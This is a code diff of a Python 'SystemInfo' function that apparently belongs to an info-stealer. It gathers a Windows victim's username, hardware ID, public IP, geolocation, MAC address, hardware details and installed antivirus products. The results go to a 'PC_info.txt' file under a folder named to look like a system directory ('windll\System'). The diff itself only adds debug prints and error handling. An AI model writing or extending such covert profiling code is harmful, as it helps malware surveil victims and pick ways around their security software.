@@ -46,23 +46,34 @@ def SystemInfo(dataForMassage):
                     return f"{bytes:.2f}{unit}{suffix}"
                 bytes /= factor
 
+        print("1")
         uname = platform.uname()
-
         namepc = "\nPc name: " + str(uname.node)# get ps name
-        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
+        print("1.1")
+        try:
+            hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
+        except Exception as e:
+            hwid = e
+            print(e)
+        print("1.2")
         user = getpass.getuser()
         timeL = time.asctime()
+        print("1.3")
         ip = requests.get('https://api.ipify.org').text
         interface, addrs = next(iter(psutil.net_if_addrs().items()))
-        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
+        print("1.4")
+        try:
+            cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
+        except:
+            cpu = platform.processor()
         mac = addrs[0].address
         countofcpu = psutil.cpu_count(logical=True)# get cpu
         allcpucount = str(countofcpu) # get number of CPU cores
-
+        print("1.6")
         cpufreq = psutil.cpu_freq()
 
-
+        print("2")
         svmem = psutil.virtual_memory()
         allram = str(get_size(svmem.total))# get Total RAM
         ramfree = str(get_size(svmem.available))# get Available RAM
@@ -73,7 +84,7 @@ def SystemInfo(dataForMassage):
 
 
 
-
+        print("3")
         partitions = psutil.disk_partitions()
         drivesData =[]
         for partition in partitions:
@@ -83,7 +94,6 @@ def SystemInfo(dataForMassage):
             try:
                 partition_usage = psutil.disk_usage(partition.mountpoint)
             except PermissionError:
-
                 continue
             allstorage = str(get_size(partition_usage.total))# get Total memory
             usedstorage = str(get_size(partition_usage.used))# get Used
@@ -92,7 +102,7 @@ def SystemInfo(dataForMassage):
             drivesData.append(f"\nDrive: {nameofdevice}\nDrive volume: {nameofdick}\nFile system type: {typeoffilesystem}\nTotal memory: {allstorage}\nUsed: {usedstorage}\nAvailable: {freestorage}\n")
 
 
-
+        print("4")
         try:
             gpus = GPUtil.getGPUs()
             list_gpus = []
@@ -112,6 +122,7 @@ def SystemInfo(dataForMassage):
         """
         all needed paths
         """
+        print("5")
         Antiviruses = {
             'C:\\Program Files\\Windows Defender': 'Windows Defender',
             'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
@@ -130,7 +141,7 @@ def SystemInfo(dataForMassage):
 
         Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]
         Antiviruses = json.dumps(Antivirus)
-
+        print("6")
         headers = {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
@@ -144,6 +155,7 @@ def SystemInfo(dataForMassage):
             location1 = requests.get(urlloc, headers=headers).text
         except Exception as e:
             print(e)
+        print("7")
         try:
             all_data = f'\n\nUser: {user}\nPc name: {namepc}\nOS type: {platform.system()} {platform.release()}\nHwid: {hwid}\nMac: {mac}\nTime: {timeL}\nIP: {ip}\nLocation and IP {location1}\n\n\nCPU: {cpu}\nNumber of CPU cores: {allcpucount}\nCPU frequency: min[{str(cpufreq.min)}Mhz]; max[{str(cpufreq.max)}Mhz]\n\n'
             for gpus in list_gpus:
@@ -153,7 +165,7 @@ def SystemInfo(dataForMassage):
                 all_data+=data
             all_data+= f'\n\nAntiviruses: {Antiviruses}'
 
-
+            print("8")
             file = open(rf'{pathtofolder}\windll\System\PC_info.txt', "w+", encoding='utf-8') 
             file.write(logo)
             file.write(all_data)
